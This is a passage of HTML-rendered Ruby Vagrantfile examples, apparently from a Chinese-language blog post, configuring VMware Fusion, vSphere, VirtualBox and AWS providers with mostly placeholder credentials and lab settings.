來達到這個目的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nkhasanov/vsphere-simple\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;YOURIP\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecompute_resource_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;YOUR DATACENTER\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eresource_pool_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;YOUR RESOURCE POOL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einsecure \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etemplate_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;VM TEMPLATE\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ename \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-test-machine\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003euser \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;administrator\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epassword \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;$p1unK_Lab\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm_base_path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;vmware_template\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003elinked_clone \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# virtual box\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;virtualbox\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003evb\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      vb\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egui \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# aws\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:aws\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003eaws, override\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# aws configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eaccess_key_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_AWS_ACCESS_KEY_ID\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esecret_access_key \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_AWS_ACCESS_KEY\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ekeypair_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esecurity_groups \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einstance_type \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;t2.small\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eregion \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;us-east-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# ubuntu 14.04 x64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eami \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-864d84ee\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# override info\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003essh\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eusername \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ubuntu\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003essh\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprivate_key_path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_AWS_PRIVATE_KEY_PATH\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esynced_folder \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_SYNC_FOLDER\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/vagrant\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003etype\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rsync\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dimroc/awsdummy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eLOCAL_BOXS\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ubuntu1404x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ubuntu/trusty64\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ubuntu1210x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;chef/ubuntu-12.10\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eAWS_AMIS\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ubuntu1404x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-864d84ee\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ubuntu1210x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-02df496b\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;windows2012r2x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-9ade1df2\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;windows2012x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-5ce32034\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;windows2008r2x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-2ae02342\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;windows2008x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-5e24e936\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;windows2003r2x64\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-b0e320d8\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVAGRANTFILE_API_VERSION\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVagrant\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econfigure(\u003cspan style=\"color:#66d9ef\"\u003eVAGRANTFILE_API_VERSION\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003econfig\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;precise64_vmware\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# vmware_fusion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;vmware_fusion\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003ev, override\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;precise64_vmware\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      v\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egui \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      v\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evmx\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;memsize\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1024\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      v\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evmx\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;numvcpus\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# vsphere\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:vsphere\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003evsphere\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nkhasanov/vsphere-simple\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;#{}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecompute_resource_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;#{}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# vsphere.resource_pool_name = \u0026#39;YOUR RESOURCE POOL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einsecure \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etemplate_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;qasus-tw-centos7x64-01\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ename \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-test-machine\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003euser \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;administrator\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epassword \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;#{}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm_base_path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;vmware_template\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003elinked_clone \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# virtual box\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;virtualbox\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003evb\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      vb\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egui \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      vb\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ememory \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan 